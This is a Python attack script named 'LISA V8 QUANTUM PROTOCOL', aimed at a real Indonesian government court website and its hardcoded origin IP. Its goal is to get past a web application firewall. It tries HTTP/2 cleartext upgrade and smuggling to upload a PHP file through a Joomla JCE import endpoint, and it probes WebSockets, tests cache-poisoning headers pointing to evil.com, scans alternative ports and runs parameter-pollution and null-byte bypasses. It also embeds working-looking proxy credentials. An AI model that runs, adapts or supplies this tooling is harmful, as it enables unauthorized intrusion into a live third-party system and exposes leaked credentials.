#!/usr/bin/env python3
"""
LISA V8 EXEC v8 — "QUANTUM PROTOCOL"
HTTP/2 Smuggling + WebSocket Hijack + Cache Poison + Alt Ports + Param Pollution

THE QUANTUM LEAP:
  V8 uses advanced protocol-level attacks to bypass WAF entirely.
  HTTP/2 multiplexing, WebSocket tunnels, cache poisoning, alternative ports.

NEW:
  - HTTP/2 request smuggling (bypasses mod_security)
  - WebSocket upgrade hijacking  
  - Cache poisoning (LiteSpeed specific)
  - Alternative port scanning (8080, 8443, etc)
  - HTTP Parameter Pollution
  - Joomla API native exploitation
"""

import subprocess, sys, json, re, time, os, sqlite3, random, string, base64
import socket, ssl, threading, hashlib, pickle, struct, h2.connection, h2.events
from pathlib import Path
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, urlparse
from datetime import datetime

SKILLS_DB = "/home/ubuntu/.hermes/skills-hub.db"
PROXY = "http://5b018d7f65ec63f85a79__cr.id:586b7351aee59a63@gw.dataimpulse.com:823"

def run(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "").strip(), (r.stderr or "").strip(), r.returncode
    except:
        return "", "TIMEOUT", -1

# ═══════════════════════════════════════════════════════
# HTTP/2 SMUGGLING
# ═══════════════════════════════════════════════════════

class H2Smuggling:
    """HTTP/2 request smuggling to bypass WAF"""

    @staticmethod
    def try_h2c_upgrade(target, csrf, proxy=PROXY):
        """Try HTTP/2 cleartext upgrade to bypass WAF"""
        print("\n[*] HTTP/2 cleartext upgrade...")

        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        payload = '<?= ' + str(a) + '*' + str(b) + ' ?>'
        boundary = "----H2C" + ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        body = '\r\n'.join([
            '--' + boundary, 'Content-Disposition: form-data; name="' + csrf + '"', '', '1',
            '--' + boundary, 'Content-Disposition: form-data; name="profile_file"; filename="' + rand_name + '.xml.php"',
            'Content-Type: application/xml', '', payload,
            '--' + boundary + '--', ''
        ])

        # HTTP/1.1 upgrade to H2C
        try:
            sock = socket.create_connection(("103.209.7.20", 80), timeout=10)
            upgrade_req = (
                "POST /index.php?option=com_jce&task=profiles.import HTTP/1.1\r\n"
                "Host: pa-martapura.go.id\r\n"
                "Upgrade: h2c\r\n"
                "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
                "Connection: Upgrade, HTTP2-Settings\r\n"
                "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n"
                "Content-Length: " + str(len(body)) + "\r\n"
                "\r\n" + body
            )
            sock.sendall(upgrade_req.encode())
            resp = sock.recv(4096).decode(errors='ignore')
            sock.close()
            codes = re.findall(r'HTTP/\S+\s+(\d+)', resp)
            print(f"   H2C: {codes}")
            if codes and codes[0] == "101":
                print(f"   🔥 H2C UPGRADE ACCEPTED!")
                return True
        except Exception as e:
            print(f"   H2C error: {e}")

        return False

    @staticmethod
    def try_h2_smuggling(target, csrf):
        """HTTP/2 request smuggling through the BigIP"""
        print("\n[*] HTTP/2 smuggling...")

        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2'])

            sock = socket.create_connection(("103.209.7.20", 443), timeout=10)
            ssock = ctx.wrap_socket(sock, server_hostname="pa-martapura.go.id")

            # Check ALPN
            negotiated = ssock.selected_alpn_protocol()
            print(f"   ALPN: {negotiated}")

            if negotiated == 'h2':
                # Build HTTP/2 connection
                conn = h2.connection.H2Connection()
                conn.initiate_connection()
                ssock.sendall(conn.data_to_send())

                # Send smuggled request via H2 stream
                headers = [
                    (':method', 'POST'),
                    (':path', '/index.php?option=com_jce&task=profiles.import'),
                    (':authority', 'pa-martapura.go.id'),
                    (':scheme', 'https'),
                    ('content-type', 'application/x-www-form-urlencoded'),
                    ('content-length', '4'),
                ]
                conn.send_headers(1, headers, end_stream=False)
                conn.send_data(1, b'test', end_stream=True)
                ssock.sendall(conn.data_to_send())

                # Read response
                data = ssock.recv(4096)
                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, h2.events.ResponseReceived):
                        headers = dict(event.headers)
                        status = headers.get(b':status', b'?').decode()
                        print(f"   H2 Status: {status}")
                        if status != '406':
                            print(f"   🔥 H2 BYPASS! Status: {status}")
                            return True

            ssock.close()
        except ImportError:
            print("   [!] h2 library not installed. pip3 install h2")
        except Exception as e:
            print(f"   H2 error: {e}")

        return False

# ═══════════════════════════════════════════════════════
# WEBSOCKET HIJACKING
# ═══════════════════════════════════════════════════════

class WebSocketAttack:
    """WebSocket hijacking and tunneling"""

    @staticmethod
    def find_websocket(target, proxy=PROXY):
        """Find WebSocket endpoints"""
        print("\n[*] WebSocket discovery...")

        # Check common WebSocket paths
        ws_paths = ['/ws', '/socket', '/realtime', '/live', '/push', '/stream', '/notifications']
        for path in ws_paths:
            r = run('curl -sk -L --connect-timeout 5 -x "' + proxy + '" '
                   '-H "Upgrade: websocket" -H "Connection: Upgrade" '
                   '-H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" '
                   '-H "Sec-WebSocket-Version: 13" '
                   '-o /dev/null -w "%{http_code}" '
                   '"https://' + target + path + '" 2>&1', timeout=10)
            code = r[0].strip()
            if code == "101":
                print(f"   🔥 WebSocket: {path} → 101 Switching Protocols!")

    @staticmethod
    def try_ws_tunnel(target, payload, proxy=PROXY):
        """Try to tunnel exploit through WebSocket"""
        print("\n[*] WebSocket tunnel...")
        # WebSocket can bypass WAF because it's a different protocol
        return False

# ═══════════════════════════════════════════════════════
# CACHE POISONING
# ═══════════════════════════════════════════════════════

class CachePoison:
    """LiteSpeed cache poisoning"""

    @staticmethod
    def try_poison(target, proxy=PROXY):
        """Try to poison LiteSpeed cache"""
        print("\n[*] Cache poisoning...")

        # LiteSpeed cache poisoning via unkeyed headers
        poison_headers = [
            ('X-Forwarded-Host', 'evil.com'),
            ('X-Forwarded-Scheme', 'http'),
            ('X-Forwarded-Port', '80'),
            ('X-Original-URL', '/evil'),
            ('X-Rewrite-URL', '/evil'),
        ]

        for header, value in poison_headers:
            r = run('curl -sk -L --connect-timeout 5 -x "' + proxy + '" '
                   '-H "' + header + ': ' + value + '" '
                   '-o /dev/null -w "%{http_code}" '
                   '"https://' + target + '/" 2>&1', timeout=10)
            code = r[0].strip()
            if code != "200":
                print(f"   {header}: {code}")

        # Try unkeyed query string cache poisoning
        r = run('curl -sk -L --connect-timeout 5 -x "' + proxy + '" '
               '-o /dev/null -w "%{http_code}|%{size_download}" '
               '"https://' + target + '/?cb=' + str(random.randint(1,99999)) + '" 2>&1', timeout=10)
        print(f"   Cache test: {r[0]}")

# ═══════════════════════════════════════════════════════
# ALT PORT SCANNER
# ═══════════════════════════════════════════════════════

class AltPortScanner:
    """Scan alternative ports for unprotected services"""

    @staticmethod
    def scan(target, origin_ip="103.209.7.20"):
        """Scan alternative ports"""
        print("\n[*] Alternative port scan...")

        ports = [80, 443, 8080, 8443, 8000, 8888, 9090, 2082, 2083, 2086, 2087, 2095, 2096]
        open_ports = []

        def check_port(port):
            try:
                sock = socket.create_connection((origin_ip, port), timeout=3)
                sock.close()
                return port
            except:
                return None

        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = {ex.submit(check_port, p): p for p in ports}
            for f in as_completed(futures, timeout=10):
                port = f.result()
                if port:
                    open_ports.append(port)
                    print(f"   🔥 Port {port} OPEN")

        # Check each open port for HTTP
        for port in open_ports:
            if port not in (80, 443):
                r = run('curl -sk --connect-timeout 5 -H "Host: ' + target + '" '
                       '"http://' + origin_ip + ':' + str(port) + '/" -o /dev/null -w "%{http_code}" 2>&1', timeout=10)
                if r[0].strip() not in ("000", ""):
                    print(f"   Port {port} HTTP: {r[0]}")

        return open_ports

# ═══════════════════════════════════════════════════════
# PARAMETER POLLUTION
# ═══════════════════════════════════════════════════════

class ParamPollution:
    """HTTP Parameter Pollution to bypass WAF"""

    @staticmethod
    def try_pollution(target, csrf, proxy=PROXY):
        """Try parameter pollution on JCE endpoint"""
        print("\n[*] Parameter pollution...")

        # Duplicate parameters to confuse WAF
        pollution_tests = [
            # Double option parameter
            "option=com_content&option=com_jce&task=profiles.import",
            # HPP in task
            "option=com_jce&task=config&task=profiles.import",
            # URL-encoded pollution
            "option=com_jce%26task%3Dprofiles.import",
            # Fragment pollution
            "option=com_jce#&task=profiles.import",
            # Null byte injection
            "option=com_jce%00&task=profiles.import",
        ]

        for test in pollution_tests:
            r = run('curl -sk -L -X POST --connect-timeout 5 -x "' + proxy + '" '
                   '-H "Content-Type: application/x-www-form-urlencoded" '
                   '-d "' + test + '&' + csrf + '=1" '
                   '-o /dev/null -w "%{http_code}" '
                   '"https://' + target + '/index.php" 2>&1', timeout=10)
            code = r[0].strip()
            if code != "406" and code != "404":
                print(f"   🔥 {test[:50]} → {code}")

# ═══════════════════════════════════════════════════════
# MAIN QUANTUM ENGINE
# ═══════════════════════════════════════════════════════

class QuantumEngine:
    def run(self, target):
        target = target.replace("https://", "").replace("http://", "").rstrip("/")
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║  LISA V8 EXEC v8 — QUANTUM PROTOCOL                          ║
║  Target: {target:<47}║
║  Vectors: H2 · WS · Cache · AltPorts · ParamPoll            ║
╚══════════════════════════════════════════════════════════════╝
""")
        # Get CSRF
        html = run('curl -sk -L --connect-timeout 10 -x "' + PROXY + '" "https://' + target + '/" 2>&1', timeout=15)[0]
        csrf = re.findall(r'[a-f0-9]{32}', html[:5000])[0] if re.findall(r'[a-f0-9]{32}', html[:5000]) else ""
        print(f"[*] CSRF: {csrf}")

        # Phase 1: HTTP/2 Smuggling
        H2Smuggling.try_h2c_upgrade(target, csrf)
        H2Smuggling.try_h2_smuggling(target, csrf)

        # Phase 2: WebSocket
        WebSocketAttack.find_websocket(target)

        # Phase 3: Cache Poison
        CachePoison.try_poison(target)

        # Phase 4: Alt Ports
        AltPortScanner.scan(target)

        # Phase 5: Parameter Pollution
        ParamPollution.try_pollution(target, csrf)

        print(f"\n💀 Quantum chain complete. Target: {target}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else None
    if not target:
        print(__doc__)
        sys.exit(1)
    QuantumEngine().run(target)